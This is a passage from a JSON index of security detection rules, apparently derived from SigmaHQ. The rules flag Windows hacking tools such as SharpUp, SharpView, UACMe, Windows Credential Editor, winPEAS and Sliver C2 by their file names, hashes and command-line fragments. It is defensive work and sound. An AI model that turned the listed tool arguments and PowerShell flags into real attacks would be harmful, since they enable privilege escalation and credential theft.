ParentProcessId\n  expression: evt.Parsed.ParentProcessId\n\n", "description": "Detects usage of the Sharp Chisel via the commandline arguments\n", "path": "scenarios/sigmahq/proc_creation_win_hktl_sharp_chisel.yml", "version": "0.2", "versions": {"0.1": {"digest": "094aca81ad0b82c1172aec5189d12e356ef41729f51201b53cbc6af3ad937773"}, "0.2": {"digest": "c09deedfe1136424f5efe3ab96cc61e9714c12ccff4e84bd384041e4a819e494"}}}, "sigmahq/proc_creation_win_hktl_sharp_impersonation": {"content": "type: trigger\nname: sigmahq/proc_creation_win_hktl_sharp_impersonation\ndescription: |\n  Detects execution of the SharpImpersonation tool. Which can be used to manipulate tokens on a Windows computers remotely (PsExec/WmiExec) or interactively\nfilter: |\n  (evt.Meta.service == 'sysmon' && evt.Parsed.EventID == '1') && (evt.Parsed.Image endsWith '\\\\SharpImpersonation.exe' || evt.Parsed.OriginalFileName == 'SharpImpersonation.exe' || evt.Parsed.CommandLine contains ' user:' && evt.Parsed.CommandLine contains ' binary:' || evt.Parsed.CommandLine contains ' user:' && evt.Parsed.CommandLine contains ' shellcode:' || evt.Parsed.CommandLine contains ' technique:CreateProcessAsUserW' || evt.Parsed.CommandLine contains ' technique:ImpersonateLoggedOnuser')\nblackhole: 2m\n#status: test\nlabels:\n  service: windows\n  confidence: 1\n  spoofable: 0\n  classification:\n   - attack.t1134.001\n   - attack.t1134.003\n\n  label: \"HackTool - SharpImpersonation Execution\"\n  behavior : \"windows:audit\"\n  remediation: false\n\nscope:\n  type: ParentProcessId\n  expression: evt.Parsed.ParentProcessId\n\n", "description": "Detects execution of the SharpImpersonation tool. Which can be used to manipulate tokens on a Windows computers remotely (PsExec/WmiExec) or interactively\n", "path": "scenarios/sigmahq/proc_creation_win_hktl_sharp_impersonation.yml", "version": "0.2", "versions": {"0.1": {"digest": "38d2f5b6d61e101d8153cd32b99f4e2c04a35073d377125f2bb3a4109bb5f3c7"}, "0.2": {"digest": "dff2b0132ef15cb24a2a615652e10929ee9862ba91a71ed1b3920d56fc5e8db2"}}}, "sigmahq/proc_creation_win_hktl_sharpersist": {"content": "type: trigger\nname: sigmahq/proc_creation_win_hktl_sharpersist\ndescription: |\n  Detects the execution of the hacktool SharPersist - used to deploy various different kinds of persistence mechanisms\nfilter: |\n  (evt.Meta.service == 'sysmon' && evt.Parsed.EventID == '1') && (evt.Parsed.Image endsWith '\\\\SharPersist.exe' || evt.Parsed.Product == 'SharPersist' || evt.Parsed.CommandLine contains ' -t schtask -c ' || evt.Parsed.CommandLine contains ' -t startupfolder -c ' || evt.Parsed.CommandLine contains ' -t reg -c ' && evt.Parsed.CommandLine contains ' -m add' || evt.Parsed.CommandLine contains ' -t service -c ' && evt.Parsed.CommandLine contains ' -m add' || evt.Parsed.CommandLine contains ' -t schtask -c ' && evt.Parsed.CommandLine contains ' -m add')\nblackhole: 2m\n#status: test\nlabels:\n  service: windows\n  confidence: 1\n  spoofable: 0\n  classification:\n   - attack.t1053\n\n  label: \"HackTool - SharPersist Execution\"\n  behavior : \"windows:audit\"\n  remediation: false\n\nscope:\n  type: ParentProcessId\n  expression: evt.Parsed.ParentProcessId\n\n", "description": "Detects the execution of the hacktool SharPersist - used to deploy various different kinds of persistence mechanisms\n", "path": "scenarios/sigmahq/proc_creation_win_hktl_sharpersist.yml", "version": "0.2", "versions": {"0.1": {"digest": "5241263e9fcc1a5b63eb2b40e4f9debf5b5f734104de27f48fbaf98bf629cafd"}, "0.2": {"digest": "c2f90c4a45838c50c40744f2c95c62e33c1601f4c5bc6b5abe548c5cfb3a0e86"}}}, "sigmahq/proc_creation_win_hktl_sharpevtmute": {"content": "type: trigger\nname: sigmahq/proc_creation_win_hktl_sharpevtmute\ndescription: |\n  Detects the use of SharpEvtHook, a tool that tampers with the Windows event logs\nfilter: |\n  (evt.Meta.service == 'sysmon' && evt.Parsed.EventID == '1') && (evt.Parsed.Image endsWith '\\\\SharpEvtMute.exe' || evt.Parsed.Description == 'SharpEvtMute' || evt.Parsed.CommandLine contains '--Filter \"rule ' || evt.Parsed.CommandLine contains '--Encoded --Filter \\\\\"')\nblackhole: 2m\n#status: test\nlabels:\n  service: windows\n  confidence: 1\n  spoofable: 0\n  classification:\n   - attack.t1562.002\n\n  label: \"HackTool - SharpEvtMute Execution\"\n  behavior : \"windows:audit\"\n  remediation: false\n\nscope:\n  type: ParentProcessId\n  expression: evt.Parsed.ParentProcessId\n\n", "description": "Detects the use of SharpEvtHook, a tool that tampers with the Windows event logs\n", "path": "scenarios/sigmahq/proc_creation_win_hktl_sharpevtmute.yml", "version": "0.2", "versions": {"0.1": {"digest": "ca89e3569876a35906bef00e6f468bab4aabdcbf726f37f5b6b9b43895b09053"}, "0.2": {"digest": "717874d853a3e7c9efea6bf14125ada5a348f4e583bc162874feab116a10f8f9"}}}, "sigmahq/proc_creation_win_hktl_sharpldapwhoami": {"content": "type: trigger\nname: sigmahq/proc_creation_win_hktl_sharpldapwhoami\ndescription: |\n  Detects SharpLdapWhoami, a whoami alternative that queries the LDAP service on a domain controller\nfilter: |\n  (evt.Meta.service == 'sysmon' && evt.Parsed.EventID == '1') && (evt.Parsed.Image endsWith '\\\\SharpLdapWhoami.exe' || evt.Parsed.OriginalFileName contains 'SharpLdapWhoami' || evt.Parsed.Product == 'SharpLdapWhoami' || evt.Parsed.CommandLine endsWith ' /method:ntlm' || evt.Parsed.CommandLine endsWith ' /method:kerb' || evt.Parsed.CommandLine endsWith ' /method:nego' || evt.Parsed.CommandLine endsWith ' /m:nego' || evt.Parsed.CommandLine endsWith ' /m:ntlm' || evt.Parsed.CommandLine endsWith ' /m:kerb')\nblackhole: 2m\n#status: test\nlabels:\n  service: windows\n  confidence: 1\n  spoofable: 0\n  classification:\n   - attack.t1033\n\n  label: \"HackTool - SharpLdapWhoami Execution\"\n  behavior : \"windows:audit\"\n  remediation: false\n\nscope:\n  type: ParentProcessId\n  expression: evt.Parsed.ParentProcessId\n\n", "description": "Detects SharpLdapWhoami, a whoami alternative that queries the LDAP service on a domain controller\n", "path": "scenarios/sigmahq/proc_creation_win_hktl_sharpldapwhoami.yml", "version": "0.2", "versions": {"0.1": {"digest": "d93884b2dd55ac70042a11db4bd97b48d380c5910030bc14088abf8cc66f0e45"}, "0.2": {"digest": "a50d54b9a75eea1ff8a0bc10e697cd1c6b0b07f7da4149710a5a99f5a04487cf"}}}, "sigmahq/proc_creation_win_hktl_sharpup": {"content": "type: trigger\nname: sigmahq/proc_creation_win_hktl_sharpup\ndescription: |\n  Detects the use of SharpUp, a tool for local privilege escalation\nfilter: |\n  (evt.Meta.service == 'sysmon' && evt.Parsed.EventID == '1') && (evt.Parsed.Image endsWith '\\\\SharpUp.exe' || evt.Parsed.Description == 'SharpUp' || evt.Parsed.CommandLine contains 'HijackablePaths' || evt.Parsed.CommandLine contains 'UnquotedServicePath' || evt.Parsed.CommandLine contains 'ProcessDLLHijack' || evt.Parsed.CommandLine contains 'ModifiableServiceBinaries' || evt.Parsed.CommandLine contains 'ModifiableScheduledTask' || evt.Parsed.CommandLine contains 'DomainGPPPassword' || evt.Parsed.CommandLine contains 'CachedGPPPassword')\nblackhole: 2m\n#status: test\nlabels:\n  service: windows\n  confidence: 1\n  spoofable: 0\n  classification:\n   - attack.t1615\n   - attack.t1569.002\n   - attack.t1574.005\n\n  label: \"HackTool - SharpUp PrivEsc Tool Execution\"\n  behavior : \"windows:audit\"\n  remediation: false\n\nscope:\n  type: ParentProcessId\n  expression: evt.Parsed.ParentProcessId\n\n", "description": "Detects the use of SharpUp, a tool for local privilege escalation\n", "path": "scenarios/sigmahq/proc_creation_win_hktl_sharpup.yml", "version": "0.2", "versions": {"0.1": {"digest": "cf5f693f41ff84b2e0259e3fd35d06a60c253419a6f03fef0e6593b7946e99b4"}, "0.2": {"digest": "8cba7f360b2ad6423fc27695b06a9577e1626e7451e677c7dac476d4a552933f"}}}, "sigmahq/proc_creation_win_hktl_sharpview": {"content": "type: trigger\nname: sigmahq/proc_creation_win_hktl_sharpview\ndescription: |\n  Adversaries may look for details about the network configuration and settings of systems they access or through information discovery of remote systems\nfilter: |\n  (evt.Meta.service == 'sysmon' && evt.Parsed.EventID == '1') && (evt.Parsed.OriginalFileName == 'SharpView.exe' || evt.Parsed.Image endsWith '\\\\SharpView.exe' || evt.Parsed.CommandLine contains 'Add-RemoteConnection' || evt.Parsed.CommandLine contains 'Convert-ADName' || evt.Parsed.CommandLine contains 'ConvertFrom-SID' || evt.Parsed.CommandLine contains 'ConvertFrom-UACValue' || evt.Parsed.CommandLine contains 'Convert-SidToName' || evt.Parsed.CommandLine contains 'Export-PowerViewCSV' || evt.Parsed.CommandLine contains 'Find-DomainObjectPropertyOutlier' || evt.Parsed.CommandLine contains 'Find-DomainProcess' || evt.Parsed.CommandLine contains 'Find-DomainShare' || evt.Parsed.CommandLine contains 'Find-DomainUserEvent' || evt.Parsed.CommandLine contains 'Find-DomainUserLocation' || evt.Parsed.CommandLine contains 'Find-ForeignGroup' || evt.Parsed.CommandLine contains 'Find-ForeignUser' || evt.Parsed.CommandLine contains 'Find-GPOComputerAdmin' || evt.Parsed.CommandLine contains 'Find-GPOLocation' || evt.Parsed.CommandLine contains 'Find-Interesting' || evt.Parsed.CommandLine contains 'Find-LocalAdminAccess' || evt.Parsed.CommandLine contains 'Find-ManagedSecurityGroups' || evt.Parsed.CommandLine contains 'Get-CachedRDPConnection' || evt.Parsed.CommandLine contains 'Get-DFSshare' || evt.Parsed.CommandLine contains 'Get-DomainComputer' || evt.Parsed.CommandLine contains 'Get-DomainController' || evt.Parsed.CommandLine contains 'Get-DomainDFSShare' || evt.Parsed.CommandLine contains 'Get-DomainDNSRecord' || evt.Parsed.CommandLine contains 'Get-DomainFileServer' || evt.Parsed.CommandLine contains 'Get-DomainForeign' || evt.Parsed.CommandLine contains 'Get-DomainGPO' || evt.Parsed.CommandLine contains 'Get-DomainGroup' || evt.Parsed.CommandLine contains 'Get-DomainGUIDMap' || evt.Parsed.CommandLine contains 'Get-DomainManagedSecurityGroup' || evt.Parsed.CommandLine contains 'Get-DomainObject' || evt.Parsed.CommandLine contains 'Get-DomainOU' || evt.Parsed.CommandLine contains 'Get-DomainPolicy' || evt.Parsed.CommandLine contains 'Get-DomainSID' || evt.Parsed.CommandLine contains 'Get-DomainSite' || evt.Parsed.CommandLine contains 'Get-DomainSPNTicket' || evt.Parsed.CommandLine contains 'Get-DomainSubnet' || evt.Parsed.CommandLine contains 'Get-DomainTrust' || evt.Parsed.CommandLine contains 'Get-DomainUserEvent' || evt.Parsed.CommandLine contains 'Get-ForestDomain' || evt.Parsed.CommandLine contains 'Get-ForestGlobalCatalog' || evt.Parsed.CommandLine contains 'Get-ForestTrust' || evt.Parsed.CommandLine contains 'Get-GptTmpl' || evt.Parsed.CommandLine contains 'Get-GroupsXML' || evt.Parsed.CommandLine contains 'Get-LastLoggedOn' || evt.Parsed.CommandLine contains 'Get-LoggedOnLocal' || evt.Parsed.CommandLine contains 'Get-NetComputer' || evt.Parsed.CommandLine contains 'Get-NetDomain' || evt.Parsed.CommandLine contains 'Get-NetFileServer' || evt.Parsed.CommandLine contains 'Get-NetForest' || evt.Parsed.CommandLine contains 'Get-NetGPO' || evt.Parsed.CommandLine contains 'Get-NetGroupMember' || evt.Parsed.CommandLine contains 'Get-NetLocalGroup' || evt.Parsed.CommandLine contains 'Get-NetLoggedon' || evt.Parsed.CommandLine contains 'Get-NetOU' || evt.Parsed.CommandLine contains 'Get-NetProcess' || evt.Parsed.CommandLine contains 'Get-NetRDPSession' || evt.Parsed.CommandLine contains 'Get-NetSession' || evt.Parsed.CommandLine contains 'Get-NetShare' || evt.Parsed.CommandLine contains 'Get-NetSite' || evt.Parsed.CommandLine contains 'Get-NetSubnet' || evt.Parsed.CommandLine contains 'Get-NetUser' || evt.Parsed.CommandLine contains 'Get-PathAcl' || evt.Parsed.CommandLine contains 'Get-PrincipalContext' || evt.Parsed.CommandLine contains 'Get-RegistryMountedDrive' || evt.Parsed.CommandLine contains 'Get-RegLoggedOn' || evt.Parsed.CommandLine contains 'Get-WMIRegCachedRDPConnection' || evt.Parsed.CommandLine contains 'Get-WMIRegLastLoggedOn' || evt.Parsed.CommandLine contains 'Get-WMIRegMountedDrive' || evt.Parsed.CommandLine contains 'Get-WMIRegProxy' || evt.Parsed.CommandLine contains 'Invoke-ACLScanner' || evt.Parsed.CommandLine contains 'Invoke-CheckLocalAdminAccess' || evt.Parsed.CommandLine contains 'Invoke-Kerberoast' || evt.Parsed.CommandLine contains 'Invoke-MapDomainTrust' || evt.Parsed.CommandLine contains 'Invoke-RevertToSelf' || evt.Parsed.CommandLine contains 'Invoke-Sharefinder' || evt.Parsed.CommandLine contains 'Invoke-UserImpersonation' || evt.Parsed.CommandLine contains 'Remove-DomainObjectAcl' || evt.Parsed.CommandLine contains 'Remove-RemoteConnection' || evt.Parsed.CommandLine contains 'Request-SPNTicket' || evt.Parsed.CommandLine contains 'Set-DomainObject' || evt.Parsed.CommandLine contains 'Test-AdminAccess')\nblackhole: 2m\n#status: test\nlabels:\n  service: windows\n  confidence: 1\n  spoofable: 0\n  classification:\n   - attack.t1049\n   - attack.t1069.002\n   - attack.t1482\n   - attack.t1135\n   - attack.t1033\n\n  label: \"HackTool - SharpView Execution\"\n  behavior : \"windows:audit\"\n  remediation: false\n\nscope:\n  type: ParentProcessId\n  expression: evt.Parsed.ParentProcessId\n\n", "description": "Adversaries may look for details about the network configuration and settings of systems they access or through information discovery of remote systems\n", "path": "scenarios/sigmahq/proc_creation_win_hktl_sharpview.yml", "version": "0.2", "versions": {"0.1": {"digest": "d55dc1c54b864128cef85b2b3ffb73544164d05fc33b15f0cba0345b59253c4e"}, "0.2": {"digest": "1eaa4b99504b83ec6438154d7388de52e8c2680b427f5036c3f587dbb1660936"}}}, "sigmahq/proc_creation_win_hktl_silenttrinity_stager": {"content": "type: trigger\nname: sigmahq/proc_creation_win_hktl_silenttrinity_stager\ndescription: |\n  Detects SILENTTRINITY stager use via PE metadata\nfilter: |\n  (evt.Meta.service == 'sysmon' && evt.Parsed.EventID == '1') && (evt.Parsed.Description contains 'st2stager')\nblackhole: 2m\n#status: test\nlabels:\n  service: windows\n  confidence: 1\n  spoofable: 0\n  classification:\n   - attack.t1071\n\n  label: \"HackTool - SILENTTRINITY Stager Execution\"\n  behavior : \"windows:audit\"\n  remediation: false\n\nscope:\n  type: ParentProcessId\n  expression: evt.Parsed.ParentProcessId\n\n", "description": "Detects SILENTTRINITY stager use via PE metadata\n", "path": "scenarios/sigmahq/proc_creation_win_hktl_silenttrinity_stager.yml", "version": "0.2", "versions": {"0.1": {"digest": "a2512fc31986ef2650f58ccca033d3d04b56d3b100a71d3987c56e37cc1e3c13"}, "0.2": {"digest": "ee3d08bfc8303940d16bb05d7539de84807c5bc588a46c2615101118c6384165"}}}, "sigmahq/proc_creation_win_hktl_sliver_c2_execution_pattern": {"content": "type: trigger\nname: sigmahq/proc_creation_win_hktl_sliver_c2_execution_pattern\ndescription: |\n  Detects process activity patterns as seen being used by Sliver C2 framework implants\nfilter: |\n  (evt.Meta.service == 'sysmon' && evt.Parsed.EventID == '1') && (evt.Parsed.CommandLine contains '-NoExit -Command [Console]::OutputEncoding=[Text.UTF8Encoding]::UTF8')\nblackhole: 2m\n#status: test\nlabels:\n  service: windows\n  confidence: 1\n  spoofable: 0\n  classification:\n   - attack.t1059\n\n  label: \"HackTool - Sliver C2 Implant Activity Pattern\"\n  behavior : \"windows:audit\"\n  remediation: false\n\nscope:\n  type: ParentProcessId\n  expression: evt.Parsed.ParentProcessId\n\n", "description": "Detects process activity patterns as seen being used by Sliver C2 framework implants\n", "path": "scenarios/sigmahq/proc_creation_win_hktl_sliver_c2_execution_pattern.yml", "version": "0.2", "versions": {"0.1": {"digest": "312dbc427179721702de816009b3a31543f59634dd93ed06ad7c7452a23ed464"}, "0.2": {"digest": "f5efeb98be92e9c49c9e03a7229af8682b7b22b1c82f0d1fbf427cdc52e73821"}}}, "sigmahq/proc_creation_win_hktl_stracciatella_execution": {"content": "type: trigger\nname: sigmahq/proc_creation_win_hktl_stracciatella_execution\ndescription: |\n  Detects Stracciatella which executes a Powershell runspace from within C# (aka SharpPick technique) with AMSI, ETW and Script Block Logging disabled based on PE metadata characteristics.\nfilter: |\n  (evt.Meta.service == 'sysmon' && evt.Parsed.EventID == '1') && (evt.Parsed.Image endsWith '\\\\Stracciatella.exe' || evt.Parsed.OriginalFileName == 'Stracciatella.exe' || evt.Parsed.Description == 'Stracciatella' || evt.Parsed.Hashes contains 'SHA256=9d25e61ec1527e2a69d7c2a4e3fe2fe15890710c198a66a9f25d99fdf6c7b956' || evt.Parsed.Hashes contains 'SHA256=fd16609bd9830c63b9413671678bb159b89c357d21942ddbb6b93add808d121a' || evt.Parsed.sha256 in ['9d25e61ec1527e2a69d7c2a4e3fe2fe15890710c198a66a9f25d99fdf6c7b956', 'fd16609bd9830c63b9413671678bb159b89c357d21942ddbb6b93add808d121a'])\nblackhole: 2m\n#status: test\nlabels:\n  service: windows\n  confidence: 1\n  spoofable: 0\n  classification:\n   - attack.t1059\n   - attack.t1562.001\n\n  label: \"HackTool - Stracciatella Execution\"\n  behavior : \"windows:audit\"\n  remediation: false\n\nscope:\n  type: ParentProcessId\n  expression: evt.Parsed.ParentProcessId\n\n", "description": "Detects Stracciatella which executes a Powershell runspace from within C# (aka SharpPick technique) with AMSI, ETW and Script Block Logging disabled based on PE metadata characteristics.\n", "path": "scenarios/sigmahq/proc_creation_win_hktl_stracciatella_execution.yml", "version": "0.2", "versions": {"0.1": {"digest": "b9327ac785c20bb39d55ad56b914579859483689e76b866acecd2bb570e44e00"}, "0.2": {"digest": "cbfde8a2a8c3d64c2ff3fd9222280ea84dbf47ae13c8f59e9f2ebd1c3785507e"}}}, "sigmahq/proc_creation_win_hktl_sysmoneop": {"content": "type: trigger\nname: sigmahq/proc_creation_win_hktl_sysmoneop\ndescription: |\n  Detects the execution of the PoC that can be used to exploit Sysmon CVE-2022-41120\nfilter: |\n  (evt.Meta.service == 'sysmon' && evt.Parsed.EventID == '1') && (evt.Parsed.Image endsWith '\\\\SysmonEOP.exe' || evt.Parsed.Hashes contains 'IMPHASH=22F4089EB8ABA31E1BB162C6D9BF72E5' || evt.Parsed.Hashes contains 'IMPHASH=5123FA4C4384D431CD0D893EEB49BBEC' || evt.Parsed.Imphash in ['22f4089eb8aba31e1bb162c6d9bf72e5', '5123fa4c4384d431cd0d893eeb49bbec'])\nblackhole: 2m\n#status: test\nlabels:\n  service: windows\n  confidence: 1\n  spoofable: 0\n  classification:\n   - attack.t1068\n\n  label: \"HackTool - SysmonEOP Execution\"\n  behavior : \"windows:audit\"\n  remediation: false\n\nscope:\n  type: ParentProcessId\n  expression: evt.Parsed.ParentProcessId\n\n", "description": "Detects the execution of the PoC that can be used to exploit Sysmon CVE-2022-41120\n", "path": "scenarios/sigmahq/proc_creation_win_hktl_sysmoneop.yml", "version": "0.2", "versions": {"0.1": {"digest": "2e8998098e46ca1ff81426d8c99efa27ec9e8f2d00aecd2c7f9007a04e6f14d1"}, "0.2": {"digest": "b3af9eca9c9d3d67501fad249273e7157b002ac44981ffdc47a10f9031400d0f"}}}, "sigmahq/proc_creation_win_hktl_trufflesnout": {"content": "type: trigger\nname: sigmahq/proc_creation_win_hktl_trufflesnout\ndescription: |\n  Detects the use of TruffleSnout.exe an iterative AD discovery toolkit for offensive operators, situational awareness and targeted low noise enumeration.\nfilter: |\n  (evt.Meta.service == 'sysmon' && evt.Parsed.EventID == '1') && (evt.Parsed.OriginalFileName == 'TruffleSnout.exe' || evt.Parsed.Image endsWith '\\\\TruffleSnout.exe')\nblackhole: 2m\n#status: test\nlabels:\n  service: windows\n  confidence: 1\n  spoofable: 0\n  classification:\n   - attack.t1482\n\n  label: \"HackTool - TruffleSnout Execution\"\n  behavior : \"windows:audit\"\n  remediation: false\n\nscope:\n  type: ParentProcessId\n  expression: evt.Parsed.ParentProcessId\n\n", "description": "Detects the use of TruffleSnout.exe an iterative AD discovery toolkit for offensive operators, situational awareness and targeted low noise enumeration.\n", "path": "scenarios/sigmahq/proc_creation_win_hktl_trufflesnout.yml", "version": "0.2", "versions": {"0.1": {"digest": "b33bccaee62acecd992c2248cab16bc5b9fbf26c7ca41d9ed1811a69814a06fe"}, "0.2": {"digest": "3b325d68888d8808d7e0b371997e915f76743d1c7575b9d36b62574430c0be6d"}}}, "sigmahq/proc_creation_win_hktl_uacme": {"content": "type: trigger\nname: sigmahq/proc_creation_win_hktl_uacme\ndescription: |\n  Detects the execution of UACMe, a tool used for UAC bypasses, via default PE metadata\nfilter: |\n  (evt.Meta.service == 'sysmon' && evt.Parsed.EventID == '1') && (evt.Parsed.Product == 'UACMe' || evt.Parsed.Company in ['REvol Corp', 'APT 92', 'UG North', 'Hazardous Environments', 'CD Project Rekt'] || evt.Parsed.Description in ['UACMe main module', 'Pentesting utility'] || evt.Parsed.OriginalFileName in ['Akagi.exe', 'Akagi64.exe'] || evt.Parsed.Image endsWith '\\\\Akagi64.exe' || evt.Parsed.Image endsWith '\\\\Akagi.exe' || evt.Parsed.Hashes contains 'IMPHASH=767637C23BB42CD5D7397CF58B0BE688' || evt.Parsed.Hashes contains 'IMPHASH=14C4E4C72BA075E9069EE67F39188AD8' || evt.Parsed.Hashes contains 'IMPHASH=3C782813D4AFCE07BBFC5A9772ACDBDC' || evt.Parsed.Hashes contains 'IMPHASH=7D010C6BB6A3726F327F7E239166D127' || evt.Parsed.Hashes contains 'IMPHASH=89159BA4DD04E4CE5559F132A9964EB3' || evt.Parsed.Hashes contains 'IMPHASH=6F33F4A5FC42B8CEC7314947BD13F30F' || evt.Parsed.Hashes contains 'IMPHASH=5834ED4291BDEB928270428EBBAF7604' || evt.Parsed.Hashes contains 'IMPHASH=5A8A8A43F25485E7EE1B201EDCBC7A38' || evt.Parsed.Hashes contains 'IMPHASH=DC7D30B90B2D8ABF664FBED2B1B59894' || evt.Parsed.Hashes contains 'IMPHASH=41923EA1F824FE63EA5BEB84DB7A3E74' || evt.Parsed.Hashes contains 'IMPHASH=3DE09703C8E79ED2CA3F01074719906B' || evt.Parsed.Imphash in ['767637c23bb42cd5d7397cf58b0be688', '14c4e4c72ba075e9069ee67f39188ad8', '3c782813d4afce07bbfc5a9772acdbdc', '7d010c6bb6a3726f327f7e239166d127', '89159ba4dd04e4ce5559f132a9964eb3', '6f33f4a5fc42b8cec7314947bd13f30f', '5834ed4291bdeb928270428ebbaf7604', '5a8a8a43f25485e7ee1b201edcbc7a38', 'dc7d30b90b2d8abf664fbed2b1b59894', '41923ea1f824fe63ea5beb84db7a3e74', '3de09703c8e79ed2ca3f01074719906b'])\nblackhole: 2m\n#status: test\nlabels:\n  service: windows\n  confidence: 1\n  spoofable: 0\n  classification:\n   - attack.t1548.002\n\n  label: \"HackTool - UACMe Akagi Execution\"\n  behavior : \"windows:audit\"\n  remediation: false\n\nscope:\n  type: ParentProcessId\n  expression: evt.Parsed.ParentProcessId\n\n", "description": "Detects the execution of UACMe, a tool used for UAC bypasses, via default PE metadata\n", "path": "scenarios/sigmahq/proc_creation_win_hktl_uacme.yml", "version": "0.2", "versions": {"0.1": {"digest": "5b31b4458961956df1d1cbd644aacdd581059db5fdf07754809cf67b03cee221"}, "0.2": {"digest": "8495ef9c564587ac51fddb76d3133b9f7241f34e7e6363dcdbab55b455f51a22"}}}, "sigmahq/proc_creation_win_hktl_wce": {"content": "type: trigger\nname: sigmahq/proc_creation_win_hktl_wce\ndescription: |\n  Detects the use of Windows Credential Editor (WCE)\nfilter: |\n  (evt.Meta.service == 'sysmon' && evt.Parsed.EventID == '1') && ((evt.Parsed.Imphash in ['a53a02b997935fd8eedcb5f7abab9b9f', 'e96a73c7bf33a464c510ede582318bf2'] || evt.Parsed.Hashes contains 'IMPHASH=a53a02b997935fd8eedcb5f7abab9b9f' || evt.Parsed.Hashes contains 'IMPHASH=e96a73c7bf33a464c510ede582318bf2' || evt.Parsed.CommandLine endsWith '.exe -S' && evt.Parsed.ParentImage endsWith '\\\\services.exe') && not (evt.Parsed.Image endsWith '\\\\clussvc.exe'))\nblackhole: 2m\n#status: test\nlabels:\n  service: windows\n  confidence: 1\n  spoofable: 0\n  classification:\n   - attack.t1003.001\n\n  label: \"HackTool - Windows Credential Editor (WCE) Execution\"\n  behavior : \"windows:audit\"\n  remediation: false\n\nscope:\n  type: ParentProcessId\n  expression: evt.Parsed.ParentProcessId\n\n", "description": "Detects the use of Windows Credential Editor (WCE)\n", "path": "scenarios/sigmahq/proc_creation_win_hktl_wce.yml", "version": "0.2", "versions": {"0.1": {"digest": "6a19823eeec7e3ce3c88c161004322c4e31f1e697971802fed3a4e211433cdb0"}, "0.2": {"digest": "23b84a64b7e043e91fa685ba76439d9a486d3a9819bb427179554c483010b14d"}}}, "sigmahq/proc_creation_win_hktl_winpeas": {"content": "type: trigger\nname: sigmahq/proc_creation_win_hktl_winpeas\ndescription: |\n  WinPEAS is a script that search for possible paths to escalate privileges on Windows hosts. The checks are explained on book.hacktricks.xyz\nfilter: |\n  (evt.Meta.service == 'sysmon' && evt.Parsed.EventID == '1') && (evt.Parsed.OriginalFileName == 'winPEAS.exe' || evt.Parsed.Image endsWith '\\\\winPEASany_ofs.exe' || evt.Parsed.Image endsWith '\\\\winPEASany.exe' || evt.Parsed.Image endsWith '\\\\winPEASx64_ofs.exe' || evt.Parsed.Image endsWith '\\\\winPEASx64.exe' || evt.Parsed.Image endsWith '\\\\winPEASx86_ofs.exe' || evt.Parsed.Image endsWith '\\\\winPEASx86.exe' || evt.Parsed.CommandLine contains ' applicationsinfo' || evt.Parsed.CommandLine contains ' browserinfo' || evt.Parsed.CommandLine contains ' eventsinfo' || evt.Parsed.CommandLine contains ' fileanalysis' || evt.Parsed.CommandLine contains ' filesinfo' || evt.Parsed.CommandLine contains ' processinfo' || evt.Parsed.CommandLine contains ' servicesinfo' || evt.Parsed.CommandLine contains ' windowscreds' || evt.Parsed.CommandLine contains 'https://github.com/carlospolop/PEASS-ng/releases/latest/download/' || evt.Parsed.ParentCommandLine endsWith ' -linpeas' || evt.Parsed.CommandLine endsWith ' -linpeas')\nblackhole: 2m\n#status: test\nlabels:\n  service: windows\n  confidence: 1\n  spoofable: 0\n  classification:\n   - attack.t1082\n   - attack.t1087\n   - attack.t1046\n\n  label: \"HackTool - winPEAS Execution\"\n  behavior : \"windows:audit\"\n  remediation: false\n\nscope:\n  type: ParentProcessId\n  expression: evt.Parsed.ParentProcessId\n\n", "description": "WinPEAS is a script that search for possible paths to escalate privileges on Windows hosts. The checks are explained on book.hacktricks.xyz\n", "path": "scenarios/sigmahq/proc_creation_win_hktl_winpeas.yml", "version": "0.2", "versions": {"0.1": {"digest": "343ab8dde76c3890b6c14148549737f671b76d85b478507e3228e98ce5a3ba41"}, "0.2": {"digest": "2bbb142e41fe791821ca665c365e6413eb79ee7cff8831bb93807275ea597426"}}}, "sigmahq/proc_creation_win_hktl_winpwn": {"content": "type: trigger\nname: sigmahq/proc_creation_win_hktl_winpwn\ndescription: |\n  Detects commandline keywords indicative of potential usge of the tool WinPwn. A tool for Windows and Active Directory reconnaissance and exploitation. \nfilter: |\n  (evt.Meta.service == 'sysmon' && evt.Parsed.EventID == '1') && (evt.Parsed.CommandLine contains 'Offline_Winpwn' || evt.Parsed.CommandLine contains 'WinPwn ' || evt.Parsed.CommandLine contains 'WinPwn.exe' || evt.Parsed.CommandLine contains 'WinPwn.ps1')\nblackhole: 2m\n#status: test\nlabels:\n  service: windows\n  confidence: 1\n  spoofable: 0\n  classification:\n   - attack.t1046\n   - attack.t1082\n   - attack.t1106\n   - attack.t1518\n   - attack.t1548.002\n   - attack.t1552.001\n   - attack.t1555\n   - attack.t1555.003\n\n  label: \"HackTool - WinPwn Execution\"\n  behavior : \"windows:audit\"\n  remediation: false\n\nscope:\n  type: ParentProcessId\n  expression: evt.Parsed.ParentProcessId\n\n", "description": "Detects commandline keywords indicative of potential usge of the tool WinPwn. A tool for Windows and Active Directory reconnaissance and exploitation. \n", "path": "scenarios/sigmahq/proc_creation_win_hktl_winpwn.yml", "version": "0.2", "versions": {"0.1": {"digest": "92156de6fe654101ca316841107c1c7a2eb160439a12a80d42065f13c9c6c199"}, "0.2": {"digest": "98734b9563d86ac9381740266cff8e9a0517003e7b52837c0961af579871dfbf"}}}, "sigmahq/proc_creation_win_hktl_wmiexec_default_powershell": {"content": "type: trigger\nname: sigmahq/proc_creation_win_hktl_wmiexec_default_powershell\ndescription: |\n  Detects the execution of PowerShell with a specific flag sequence that is used by the Wmiexec script\nfilter: |\n  (evt.Meta.service == 'sysmon' && evt.Parsed.EventID == '1') && (evt.Parsed.CommandLine contains '-NoP -NoL -sta -NonI -W Hidden -Exec Bypass -Enc')\nblackhole: 2m\n#status: test\nlabels:\n  service: windows\n  confidence: 1\n  spoofable: 0\n  classification:\n\n  label: \"HackTool - Wmiexec Default Powershell Command\"\n  behavior : \"windows:audit\"\n  remediation: false\n\nscope:\n  type: ParentProcessId\n  expression: evt.Parsed.ParentProcessId\n\n", "description": "Detects the execution of PowerShell with a specific flag sequence that is used by the Wmiexec script\n", "path": "scenarios/sigmahq/proc_creation_win_hktl_wmiexec_default_powershell.yml", "version": "0.2", "versions": {"0.1": {"digest": "1cd093c60cb1d75cff6fca0ca22281f94fd85c1630ca81e6f21b987a027f9bfb"}, "0.2": {"digest": "0d0c9ab2b0f19a2dca3b3fda33369d5691e41e59a771598f27da93f4fa8d28d6"}}}, "sigmahq/proc_creation_win_hktl_xordump": {"content": "type: trigger\nname: sigmahq/proc_creation_win_hktl_xordump\ndescription: |\n  